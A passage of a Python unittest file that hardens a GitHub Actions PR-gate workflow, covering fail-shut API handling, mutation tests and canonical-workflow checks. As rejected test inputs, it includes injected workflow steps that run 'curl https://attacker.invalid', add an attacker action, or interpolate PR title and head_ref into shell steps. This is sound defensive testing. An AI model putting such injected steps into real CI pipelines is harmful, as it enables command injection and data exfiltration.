                "sha": "b" * 40,
                "repo": {"full_name": REPOSITORY},
                "user": {"login": "phasetr"},
            },
        }
        for field, value in mutations.items():
            with self.subTest(field=field):
                p2 = copy.deepcopy(self.pr)
                p2[field] = value
                transport = FakeTransport([self.pr, p2], self.paths)
                result = live.evaluate_pr(
                    transport, REPOSITORY, 4805, checker(0)
                )
                self.assertEqual(result, 1)
                self.assertEqual(transport.posts[-1][1]["state"], "failure")
                self.assertTrue(
                    all(path.endswith(HEAD_SHA) for path, _ in transport.posts)
                )

    def test_same_repo_fork_and_dependabot_metadata_never_changes_execution(self) -> None:
        for repo, actor in [
            (REPOSITORY, "phasetr"),
            ("contributor/ising-model", "contributor"),
            ("dependabot/ising-model", "dependabot[bot]"),
        ]:
            with self.subTest(repo=repo, actor=actor):
                pr = pr_data(self.paths, head_repository=repo, actor=actor)
                transport = FakeTransport([pr, pr], self.paths)
                self.assertEqual(
                    live.evaluate_pr(transport, REPOSITORY, 4805, checker(0)),
                    0,
                )
                if repo != REPOSITORY:
                    self.assertFalse(any(repo in path for path in transport.gets))

    def test_api_and_status_failures_fail_shut(self) -> None:
        endpoint = f"/repos/{REPOSITORY}/pulls/4805"
        transport = FakeTransport([self.pr], self.paths)
        transport.fail_get[endpoint] = live.LiveGateError("API_TIMEOUT")
        self.assertEqual(live.evaluate_pr(transport, REPOSITORY, 4805, checker(0)), 1)
        transport = FakeTransport([self.pr, self.pr], self.paths)
        transport.fail_post_at.add(1)
        self.assertEqual(live.evaluate_pr(transport, REPOSITORY, 4805, checker(0)), 1)
        transport = FakeTransport([self.pr, self.pr], self.paths)
        transport.fail_post_at.add(0)
        self.assertEqual(live.evaluate_pr(transport, REPOSITORY, 4805, checker(0)), 1)

    def test_closed_non_main_and_cross_repository_prs_fail(self) -> None:
        closed = pr_data(self.paths, state="closed")
        transport = FakeTransport([closed], self.paths)
        self.assertEqual(live.evaluate_pr(transport, REPOSITORY, 4805, checker(0)), 1)
        self.assertEqual(transport.posts, [])
        non_main = pr_data(self.paths)
        non_main["base"]["ref"] = "release"
        transport = FakeTransport([non_main], self.paths)
        self.assertEqual(live.evaluate_pr(transport, REPOSITORY, 4805, checker(0)), 1)
        self.assertEqual(transport.posts, [])
        cross_repository = pr_data(self.paths)
        cross_repository["base_repo"]["full_name"] = "other/project"
        transport = FakeTransport([cross_repository], self.paths)
        self.assertEqual(live.evaluate_pr(transport, REPOSITORY, 4805, checker(0)), 1)
        self.assertEqual(transport.posts, [])

    def test_body_context_and_diagnostic_bounds_fail(self) -> None:
        huge_body = "x" * (live.MAX_BODY_BYTES + 1)
        pr = pr_data(self.paths, body=huge_body)
        transport = FakeTransport([pr], self.paths)
        self.assertEqual(live.evaluate_pr(transport, REPOSITORY, 4805, checker(0)), 1)
        self.assertEqual(
            [payload["state"] for _, payload in transport.posts],
            ["pending", "failure"],
        )
        self.assertFalse(any("/files?" in path for path in transport.gets))
        with self.assertRaisesRegex(live.LiveGateError, "DIAGNOSTIC_LIMIT_EXCEEDED"):
            live.sanitize_diagnostic("x" * (live.MAX_DIAGNOSTIC_BYTES + 1))
        large_paths = [
            f"{index:04d}-" + "x" * 390
            for index in range(live.MAX_CHANGED_FILES)
        ]
        snapshot = live.Snapshot(
            number=4805,
            state="open",
            draft=False,
            base_sha=BASE_SHA,
            head_sha=HEAD_SHA,
            body="body",
            body_digest="sha256:" + "0" * 64,
            changed_file_count=len(large_paths),
            changed_paths=tuple(large_paths),
            path_digest=offline.sorted_path_digest(large_paths),
            repository=REPOSITORY,
            head_repository=REPOSITORY,
            head_actor="phasetr",
        )
        with self.assertRaisesRegex(live.LiveGateError, "CONTEXT_LIMIT_EXCEEDED"):
            live.build_offline_context(snapshot, [4801], [])


class HTTPTransportTest(unittest.TestCase):
    def setUp(self) -> None:
        self.transport = live.GitHubTransport("secret", REPOSITORY)
        self.endpoint = f"/repos/{REPOSITORY}/pulls/4805"

    def test_valid_json_and_fixed_url(self) -> None:
        response = FakeHTTPResponse(b'{"number":4805}')
        with mock.patch.object(live.request, "urlopen", return_value=response) as opened:
            self.assertEqual(self.transport.get(self.endpoint), {"number": 4805})
        request_arg = opened.call_args.args[0]
        self.assertEqual(request_arg.full_url, live.API_BASE + self.endpoint)
        self.assertNotIn("secret", request_arg.full_url)

    def test_malformed_truncated_rate_and_timeout_fail(self) -> None:
        with mock.patch.object(
            live.request,
            "urlopen",
            return_value=FakeHTTPResponse(b"{"),
        ):
            with self.assertRaisesRegex(live.LiveGateError, "MALFORMED_API_RESPONSE"):
                self.transport.get(self.endpoint)
        oversized = b"x" * (live.MAX_API_RESPONSE_BYTES + 1)
        with mock.patch.object(
            live.request,
            "urlopen",
            return_value=FakeHTTPResponse(oversized),
        ):
            with self.assertRaisesRegex(
                live.LiveGateError,
                "API_RESPONSE_LIMIT_EXCEEDED",
            ):
                self.transport.get(self.endpoint)
        rate = live.error.HTTPError(
            live.API_BASE + self.endpoint,
            429,
            "rate",
            None,
            None,
        )
        with mock.patch.object(live.request, "urlopen", side_effect=rate):
            with self.assertRaisesRegex(live.LiveGateError, "API_RATE_LIMIT"):
                self.transport.get(self.endpoint)
        with mock.patch.object(
            live.request,
            "urlopen",
            side_effect=live.error.URLError("timeout"),
        ) as opened, mock.patch.object(live.time, "sleep"):
            with self.assertRaisesRegex(live.LiveGateError, "API_TIMEOUT"):
                self.transport.get(self.endpoint)
            self.assertEqual(opened.call_count, live.REQUEST_RETRIES + 1)

    def test_optional_not_found_and_untrusted_paths(self) -> None:
        missing = live.error.HTTPError(
            live.API_BASE + self.endpoint,
            404,
            "missing",
            None,
            None,
        )
        with mock.patch.object(live.request, "urlopen", side_effect=missing):
            self.assertIsNone(
                self.transport.get(self.endpoint, allow_not_found=True)
            )
        for path in [
            "https://example.test/",
            f"/repos/{REPOSITORY}/actions/secrets",
            f"/repos/{REPOSITORY}/pulls/4805/files?page=1",
        ]:
            with self.subTest(path=path):
                with self.assertRaisesRegex(live.LiveGateError, "UNTRUSTED_API_PATH"):
                    self.transport.get(path)
        with self.assertRaisesRegex(live.LiveGateError, "UNTRUSTED_STATUS_PATH"):
            self.transport.post(
                f"/repos/{REPOSITORY}/statuses/not-a-sha",
                live.status_payload("failure", "TEST"),
            )


class MutationTest(unittest.TestCase):
    _serial = 0

    @classmethod
    def mutant(cls, old: str, new: str) -> types.ModuleType:
        """Load one textual weakening as an isolated module."""
        source = LIVE_PATH.read_text(encoding="utf-8")
        if source.count(old) != 1:
            raise AssertionError(f"mutation target count is {source.count(old)}")
        cls._serial += 1
        name = f"completion_claim_live_mutant_{cls._serial}"
        module = types.ModuleType(name)
        module.__file__ = str(LIVE_PATH)
        sys.modules[name] = module
        exec(compile(source.replace(old, new), str(LIVE_PATH), "exec"), module.__dict__)
        return module

    def test_status_context_mutant_is_killed(self) -> None:
        mutant = self.mutant(
            'STATUS_CONTEXT = "completion-claim/live"',
            'STATUS_CONTEXT = "completion-claim/live-weakened"',
        )
        self.assertEqual(
            live.status_payload("pending", "PENDING")["context"],
            "completion-claim/live",
        )
        self.assertNotEqual(
            mutant.status_payload("pending", "PENDING")["context"],
            "completion-claim/live",
        )

    def test_structured_reference_bound_mutant_is_killed(self) -> None:
        mutant = self.mutant(
            "MAX_STRUCTURED_REFERENCES = 16",
            "MAX_STRUCTURED_REFERENCES = 1001",
        )
        paths = ["scripts/example.py"]
        references = [f"Refs #{5000 + index}" for index in range(17)]
        payload = live.structured_payload(
            managed_body(paths, references=references)
        )
        with self.assertRaisesRegex(
            live.LiveGateError,
            "STRUCTURED_REFERENCE_LIMIT_EXCEEDED",
        ):
            live.structured_references(payload)
        self.assertEqual(len(mutant.structured_references(payload)), 17)

    def test_workflow_digest_guard_mutant_is_killed(self) -> None:
        mutant = self.mutant(
            "if digest != WORKFLOW_SHA256:",
            "if False:",
        )
        text = WORKFLOW_PATH.read_bytes().decode("utf-8")
        wrong_digest = "0" * 64
        with (
            mock.patch.object(live, "WORKFLOW_SHA256", wrong_digest),
            self.assertRaisesRegex(
                live.LiveGateError,
                "WORKFLOW_DIGEST_MISMATCH",
            ),
        ):
            live.validate_workflow_text(text)
        with mock.patch.object(mutant, "WORKFLOW_SHA256", wrong_digest):
            mutant.validate_workflow_text(text)

    def test_workflow_canonical_text_guard_mutant_is_killed(self) -> None:
        mutant = self.mutant(
            "if text != canonical_workflow_text():",
            "if False:",
        )
        text = WORKFLOW_PATH.read_bytes().decode("utf-8")
        mutation = (
            text
            + "\n  attacker: {runs-on: ubuntu-latest, "
            + "steps: [{run: curl https://attacker.invalid}]}\n"
        )
        coordinated = hashlib.sha256(mutation.encode("utf-8")).hexdigest()
        with (
            mock.patch.object(live, "WORKFLOW_SHA256", coordinated),
            self.assertRaisesRegex(
                live.LiveGateError,
                "WORKFLOW_CANONICAL_TEXT_MISMATCH",
            ),
        ):
            live.validate_workflow_text(mutation)
        with mock.patch.object(mutant, "WORKFLOW_SHA256", coordinated):
            mutant.validate_workflow_text(mutation)

    def test_pending_finalizer_mutant_is_killed(self) -> None:
        mutant = self.mutant(
            "if head_sha is not None and pending_written:",
            "if False:",
        )
        paths = ["scripts/example.py"]
        pr = pr_data(paths)
        files = (
            f"/repos/{REPOSITORY}/pulls/4805/files"
            "?per_page=100&page=1"
        )
        real_transport = FakeTransport([pr], paths)
        real_transport.fail_get[files] = live.LiveGateError("API_TIMEOUT")
        mutant_transport = FakeTransport([pr], paths)
        mutant_transport.fail_get[files] = live.LiveGateError("API_TIMEOUT")
        self.assertEqual(
            live.evaluate_pr(
                real_transport,
                REPOSITORY,
                4805,
                checker(0),
            ),
            1,
        )
        self.assertEqual(
            mutant.evaluate_pr(
                mutant_transport,
                REPOSITORY,
                4805,
                checker(0),
            ),
            1,
        )
        self.assertEqual(
            [payload["state"] for _, payload in real_transport.posts],
            ["pending", "failure"],
        )
        self.assertEqual(
            [payload["state"] for _, payload in mutant_transport.posts],
            ["pending"],
        )

    def test_issue_parent_cache_mutant_is_killed(self) -> None:
        mutant = self.mutant(
            "if current not in parent_cache:",
            "if True:",
        )
        paths = ["scripts/example.py"]
        body = managed_body(
            paths,
            references=["Refs #4801", "Refs #4802", "Part of #4796"],
        )
        parents = {4801: 4796, 4802: 4796, 4796: None}
        real_transport = FakeTransport(
            [pr_data(paths, body=body)],
            paths,
            parents=parents,
        )
        mutant_transport = FakeTransport(
            [pr_data(paths, body=body)],
            paths,
            parents=parents,
        )
        self.assertEqual(
            live.derive_allowed_issue_refs(
                real_transport,
                REPOSITORY,
                body,
            ),
            [4796, 4801, 4802],
        )
        self.assertEqual(
            mutant.derive_allowed_issue_refs(
                mutant_transport,
                REPOSITORY,
                body,
            ),
            [4796, 4801, 4802],
        )
        real_issue_gets = [
            path for path in real_transport.gets if "/issues/" in path
        ]
        mutant_issue_gets = [
            path for path in mutant_transport.gets if "/issues/" in path
        ]
        self.assertEqual(len(real_issue_gets), len(set(real_issue_gets)))
        self.assertGreater(
            len(mutant_issue_gets),
            len(set(mutant_issue_gets)),
        )

    def test_pagination_ceiling_mutant_is_killed(self) -> None:
        source = LIVE_PATH.read_text(encoding="utf-8")
        source = source.replace("MAX_CHANGED_FILES = 3000", "MAX_CHANGED_FILES = 3001")
        source = source.replace("MAX_FILE_PAGES = 30", "MAX_FILE_PAGES = 31")
        name = "completion_claim_live_mutant_pagination"
        mutant = types.ModuleType(name)
        mutant.__file__ = str(LIVE_PATH)
        sys.modules[name] = mutant
        exec(compile(source, str(LIVE_PATH), "exec"), mutant.__dict__)
        paths = [f"p/{index:04d}" for index in range(3001)]
        transport = FakeTransport([pr_data(paths)], paths)
        with self.assertRaisesRegex(live.LiveGateError, "FILE_LIMIT_EXCEEDED"):
            live.collect_changed_paths(transport, REPOSITORY, 4805, 3001)
        self.assertEqual(
            len(mutant.collect_changed_paths(transport, REPOSITORY, 4805, 3001)),
            3001,
        )

    def test_snapshot_comparison_mutant_is_killed(self) -> None:
        mutant = self.mutant(
            "if p1.comparison_key() != p2.comparison_key():",
            "if False:",
        )
        paths = ["scripts/example.py"]
        p1 = pr_data(paths)
        p2 = pr_data(paths, body=managed_body(paths) + "body changed\n")
        real_transport = FakeTransport([p1, p2], paths)
        mutant_transport = FakeTransport([p1, p2], paths)
        self.assertEqual(
            live.evaluate_pr(real_transport, REPOSITORY, 4805, checker(0)),
            1,
        )
        self.assertEqual(
            mutant.evaluate_pr(mutant_transport, REPOSITORY, 4805, checker(0)),
            0,
        )

    def test_exit_code_mapping_mutant_is_killed(self) -> None:
        mutant = self.mutant(
            "if exit_code != offline.EXIT_PASS or not isinstance(report, dict):",
            "if False:",
        )
        paths = ["scripts/example.py"]
        pr = pr_data(paths)

        def exit_two_pass_report(
            context: object,
            body: str,
        ) -> tuple[int, dict[str, object]]:
            del context, body
            return 2, {
                "schema_version": 1,
                "machine_status": "PASS",
                "diagnostics": [],
            }

        real_transport = FakeTransport([pr, pr], paths)
        mutant_transport = FakeTransport([pr, pr], paths)
        self.assertEqual(
            live.evaluate_pr(
                real_transport,
                REPOSITORY,
                4805,
                exit_two_pass_report,
            ),
            1,
        )
        self.assertEqual(
            mutant.evaluate_pr(
                mutant_transport,
                REPOSITORY,
                4805,
                exit_two_pass_report,
            ),
            0,
        )


class WorkflowSecurityTest(unittest.TestCase):
    def setUp(self) -> None:
        self.text = WORKFLOW_PATH.read_bytes().decode("utf-8")

    def test_static_workflow_contract(self) -> None:
        self.assertEqual(self.text, live.canonical_workflow_text())
        self.assertEqual(
            WORKFLOW_PATH.read_bytes(),
            live.canonical_workflow_text().encode("utf-8"),
        )
        live.validate_workflow_text(self.text)
        self.assertNotIn("workflow_dispatch", self.text)
        self.assertIn("repository_dispatch:", self.text)
        self.assertIn("types: [completion_claim_replay]", self.text)
        self.assertIn("matrix.pr_number", self.text)
        self.assertIn("github.repository_id", self.text)
        self.assertEqual(self.text.count("cancel-in-progress: true"), 1)
        self.assertEqual(self.text.count("ref: ${{ github.workflow_sha }}"), 2)
        self.assertEqual(self.text.count("persist-credentials: false"), 2)
        self.assertIn("contents: read", self.text)
        self.assertIn("pull-requests: read", self.text)
        self.assertIn("issues: read", self.text)
        self.assertIn("statuses: write", self.text)
        self.assertIn("persist-credentials: false", self.text)
        self.assertIn("fetch-depth: 1", self.text)
        self.assertIn("ref: ${{ github.workflow_sha }}", self.text)
        self.assertIn("cancel-in-progress: true", self.text)
        self.assertIn("timeout-minutes: 5", self.text)
        self.assertRegex(self.text, r"actions/checkout@[0-9a-f]{40}")
        for forbidden in [
            "github.event.pull_request.head",
            "github.event.pull_request.merge",
            "actions/cache",
            "download-artifact",
            "upload-artifact",
            "pull_request_head",
        ]:
            self.assertNotIn(forbidden, self.text)

    def test_coordinated_digest_rejects_flow_style_extra_job_canonically(self) -> None:
        mutation = (
            self.text
            + "\n  attacker: {runs-on: ubuntu-latest, "
            + "steps: [{run: curl https://attacker.invalid}]}\n"
        )
        coordinated = hashlib.sha256(mutation.encode("utf-8")).hexdigest()
        with (
            mock.patch.object(live, "WORKFLOW_SHA256", coordinated),
            self.assertRaisesRegex(
                live.LiveGateError,
                "WORKFLOW_CANONICAL_TEXT_MISMATCH",
            ),
        ):
            live.validate_workflow_text(mutation)

    def test_every_noncanonical_yaml_or_byte_mutation_fails_first(self) -> None:
        mutations = {
            "flow-step": self.text.replace(
                "    steps:\n      - name:",
                "    steps:\n"
                "      - {run: curl https://attacker.invalid}\n"
                "      - name:",
                1,
            ),
            "anchor-alias": (
                self.text
                + "\nattacker: &attacker {run: curl https://attacker.invalid}\n"
                + "attacker_alias: *attacker\n"
            ),
            "extra-top-key": self.text + "\nattacker: true\n",
            "comment": self.text + "# unreviewed comment\n",
            "whitespace": self.text.replace(
                "name: Completion Claim Live",
                "name: Completion Claim Live ",
                1,
            ),
            "crlf": self.text.replace("\n", "\r\n"),
        }
        for name, mutation in mutations.items():
            coordinated = hashlib.sha256(mutation.encode("utf-8")).hexdigest()
            with (
                self.subTest(name=name),
                mock.patch.object(live, "WORKFLOW_SHA256", coordinated),
                self.assertRaisesRegex(
                    live.LiveGateError,
                    "WORKFLOW_CANONICAL_TEXT_MISMATCH",
                ),
            ):
                live.validate_workflow_text(mutation)

    def test_security_mutations_are_killed(self) -> None:
        mutations = [
            ("statuses: write", "statuses: read"),
            ("edited, ready_for_review", "ready_for_review"),
            ("ref: ${{ github.workflow_sha }}", "ref: ${{ github.sha }}"),
            ("persist-credentials: false", "persist-credentials: true"),
            ("cancel-in-progress: true", "cancel-in-progress: false"),
            ("actions/checkout@", "actions/checkout@v"),
            ("matrix.pr_number", "github.event_name"),
        ]
        for old, new in mutations:
            with self.subTest(old=old):
                self.assertIn(old, self.text)
                with self.assertRaises(live.LiveGateError):
                    live.validate_workflow_text(self.text.replace(old, new, 1))

    def test_scalar_extra_permissions_and_multiline_event_expression_fail(self) -> None:
        for mutation in [
            self.text + "\npermissions: write-all\n",
            self.text.replace("permissions: {}", "permissions: read-all", 1),
            self.text.replace("permissions: {}", "permissions: {contents: write}", 1),
            self.text.replace(
                "      statuses: write",
                "      statuses: write\n      actions: write",
                1,
            ),
            self.text
            + "\n  injected:\n    runs-on: ubuntu-latest\n"
            + "    steps:\n      - run: |\n"
            + "          echo \"${{ github.event.pull_request.title }}\"\n",
            self.text
            + "\n  injected:\n    runs-on: ubuntu-latest\n"
            + "    steps:\n      - run: |\n"
            + "          echo \"${{ github.head_ref }}\"\n",
        ]:
            with self.assertRaises(live.LiveGateError):
                live.validate_workflow_text(mutation)

    def test_exact_steps_reject_curl_suffix_attacker_action_and_whitespace(self) -> None:
        mutations = [
            self.text.replace(
                'select >> "$GITHUB_OUTPUT"',
                'select >> "$GITHUB_OUTPUT"; curl https://attacker.invalid',
                1,
            ),
            self.text.replace(
                "run: python3 scripts/completion_claim_live.py process",
                "run: |\n          python3 scripts/completion_claim_live.py process",
                1,
            ),
            self.text
            + "\n  attacker:\n    runs-on: ubuntu-latest\n"
            + "    steps:\n      - uses: attacker/action@"
            + "0123456789abcdef0123456789abcdef01234567\n",
            self.text + "\n",
        ]
        for mutation in mutations:
            with self.subTest(mutation=mutation[-80:]):
                with self.assertRaises(live.LiveGateError):
                    live.validate_workflow_text(mutation)

    def test_coordinated_digest_cannot_hide_noncanonical_step_attacks(self) -> None:
        checkout_line = (
            "      - uses: attacker/action@"
            "0123456789abcdef0123456789abcdef01234567"
        )
        mutations = [
            self.text.replace(
                "    steps:\n      - name:",
                f"    steps:\n{checkout_line}\n      - name:",
                1,
            ),
            self.text.replace(
                "        run: python3 scripts/completion_claim_live.py process",
                "        run: python3 scripts/completion_claim_live.py process"
                "\n      - run: curl https://attacker.invalid",
                1,
            ),
            self.text.replace(
                "          fetch-depth: 1",
                "          fetch-depth: 1"
                "\n          - uses: attacker/action@"
                "0123456789abcdef0123456789abcdef01234567",
                1,
            ),
            self.text.replace(
                "        id: select",
                "        - run: curl https://attacker.invalid"
                "\n        id: select",
                1,
            ),
            self.text.replace(
                "        run: python3 scripts/completion_claim_live.py process",
                "        run: python3 scripts/completion_claim_live.py process"
                "\n        shell: bash",
                1,
            ),
            self.text.replace(
                "        run: python3 scripts/completion_claim_live.py process",
                "        run: python3 scripts/completion_claim_live.py process"
                "\n        working-directory: /tmp",
                1,
            ),
            self.text.replace(
                "        run: python3 scripts/completion_claim_live.py process",
                "        run: python3 scripts/completion_claim_live.py process"
                "\n        continue-on-error: true",
                1,
            ),
            self.text.replace(
                "run: python3 scripts/completion_claim_live.py process",
                "run: python3 scripts/completion_claim_live.py process"
                "; curl https://attacker.invalid",
                1,
            ),
            self.text.replace(
                "run: python3 scripts/completion_claim_live.py process",
                "run: |\n          "
                "python3 scripts/completion_claim_live.py process",
                1,
            ),
            self.text
            + "\n  attacker:\n"
            + "    runs-on: ubuntu-latest\n"
            + "    steps:\n"
            + "      - uses: attacker/action@"
            + "0123456789abcdef0123456789abcdef01234567\n",
        ]
        for mutation in mutations:
            coordinated = hashlib.sha256(mutation.encode("utf-8")).hexdigest()
            with (
                self.subTest(mutation=mutation[-120:]),
                mock.patch.object(live, "WORKFLOW_SHA256", coordinated),
                self.assertRaisesRegex(
                    live.LiveGateError,
                    "WORKFLOW_CANONICAL_TEXT_MISMATCH",
                ),
            ):
                live.validate_workflow_text(mutation)

    def test_coordinated_permission_and_expression_mutants_fail_canonical(self) -> None:
        permission_mutant = self.text.replace(
            "      statuses: write",
            "      actions: write",
            1,
        )
        permission_digest = hashlib.sha256(
            permission_mutant.encode("utf-8")
        ).hexdigest()
        with (
            mock.patch.object(
                live,
                "WORKFLOW_SHA256",
                permission_digest,
            ),
            self.assertRaisesRegex(
                live.LiveGateError,
                "WORKFLOW_CANONICAL_TEXT_MISMATCH",
            ),
        ):
            live.validate_workflow_text(permission_mutant)

        expression_mutant = self.text.rsplit(
            "${{ matrix.pr_number }}",
            1,
        )
        expression_text = "${{ github.run_id }}".join(expression_mutant)
        expression_digest = hashlib.sha256(
            expression_text.encode("utf-8")
        ).hexdigest()
        with (
            mock.patch.object(
                live,
                "WORKFLOW_SHA256",
                expression_digest,
            ),
            self.assertRaisesRegex(
                live.LiveGateError,
                "WORKFLOW_CANONICAL_TEXT_MISMATCH",
            ),
        ):
            live.validate_workflow_text(expression_text)

    def test_all_events_share_one_pr_matrix_concurrency_key(self) -> None:
        expected = (
            "completion-claim-live-${{ github.repository_id }}-"
            "${{ matrix.pr_number }}"
        )
        self.assertIn(expected, self.text)
        for stale_key in [
            "github.event_name",
            "github.run_id",
            "main-backfill",
            "inputs.pr_number",
        ]:
            self.assertNotIn(stale_key, self.text)


class WiringTest(unittest.TestCase):
    def test_existing_ci_runs_both_self_tests(self) -> None:
        text = CI_PATH.read_text(encoding="utf-8")
        self.assertIn("python3 scripts/test_completion_claim_gate.py", text)
        self.assertIn("python3 scripts/test_completion_claim_live.py", text)

    def test_phase1_suite_pins_the_live_workflow_as_separate(self) -> None:
        text = (SCRIPT_DIR / "test_completion_claim_gate.py").read_text(encoding="utf-8")
        self.assertIn("completion_claim_live.yml", text)
        self.assertIn("test_completion_claim_live.py", text)

    def test_adapter_imports_no_candidate_or_dynamic_execution_facility(self) -> None:
        spec = importlib.util.spec_from_file_location("live_security", LIVE_PATH)
        assert spec and spec.loader
        module = types.ModuleType("live_security")
        source = LIVE_PATH.read_text(encoding="utf-8")
        tree = ast.parse(source)
        forbidden_calls = {"eval", "exec", "compile", "__import__"}
        called = {
            node.func.id
            for node in ast.walk(tree)
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Name)
        }
        self.assertFalse(called & forbidden_calls)
        self.assertNotIn("importlib", source)
        self.assertNotIn("pickle", source)

    def test_adapter_selects_then_processes_exactly_one_pr_without_status_loop(self) -> None:
        source = LIVE_PATH.read_text(encoding="utf-8")
        tree = ast.parse(source)
        functions = {
            node.name: node
            for node in tree.body
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))
        }
        self.assertIn("select_pr_numbers", functions)
        self.assertIn("process_pr", functions)
        self.assertNotIn("run_event", functions)
        process_source = ast.get_source_segment(source, functions["process_pr"])
        assert process_source is not None
        self.assertNotIn("for ", process_source)

    def test_cli_modes_emit_matrix_json_or_process_one_number(self) -> None:
        paths = ["scripts/example.py"]
        transport = FakeTransport([pr_data(paths)], paths)
        event = {"action": "opened", "pull_request": {"number": 4805}}
        environment = {
            "GITHUB_REPOSITORY": REPOSITORY,
            "GITHUB_TOKEN": "token",
            "GITHUB_EVENT_NAME": "pull_request_target",
            "GITHUB_EVENT_PATH": "event.json",
        }
        with (
            mock.patch.dict(os.environ, environment, clear=True),
            mock.patch.object(live, "GitHubTransport", return_value=transport),
            mock.patch.object(live, "_read_event", return_value=event),
            mock.patch("builtins.print") as print_mock,
        ):
            self.assertEqual(live.main(["select"]), 0)
            print_mock.assert_called_once_with("pr_numbers=[4805]")
        process_environment = {
            "GITHUB_REPOSITORY": REPOSITORY,
            "GITHUB_TOKEN": "token",
            "COMPLETION_CLAIM_PR_NUMBER": "4805",
        }
        with (
            mock.patch.dict(os.environ, process_environment, clear=True),
            mock.patch.object(live, "GitHubTransport", return_value=transport),
            mock.patch.object(live, "process_pr", return_value=0) as process_mock,
        ):
            self.assertEqual(live.main(["process"]), 0)
            process_mock.assert_called_once_with(transport, REPOSITORY, 4805)


if __name__ == "__main__":
    unittest.main(verbosity=2)
